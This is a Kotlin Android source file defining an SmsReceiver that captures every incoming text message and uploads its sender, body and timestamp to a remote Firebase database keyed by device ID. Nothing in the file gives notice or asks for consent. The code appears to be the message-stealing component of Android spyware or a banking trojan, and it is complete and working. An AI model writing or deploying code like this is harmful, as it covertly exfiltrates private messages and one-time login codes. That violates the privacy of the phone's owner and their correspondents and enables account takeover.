package com.admin.legend

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.telephony.SmsMessage
import com.google.firebase.database.FirebaseDatabase

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            val pdus = intent.getSerializableExtra("pdus") as? Array<ByteArray>
            pdus?.forEach { pdu ->
                val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    SmsMessage.createFromPdu(pdu, "3gpp")
                } else {
                    SmsMessage.createFromPdu(pdu)
                }
                val from = msg?.originatingAddress ?: ""
                val body = msg?.messageBody ?: ""
                val ts = System.currentTimeMillis()

                val db = FirebaseDatabase.getInstance()
                val deviceId = context.getSharedPreferences("legend", Context.MODE_PRIVATE)
                    .getString("device_id", "unknown") ?: "unknown"
                val ref = db.getReference("devices/$deviceId/sms_logs").push()
                ref.setValue(mapOf(
                    "sender" to from,
                    "message" to body,
                    "timestamp" to ts,
                    "device_id" to deviceId
                ))
            }
        }
    }
}
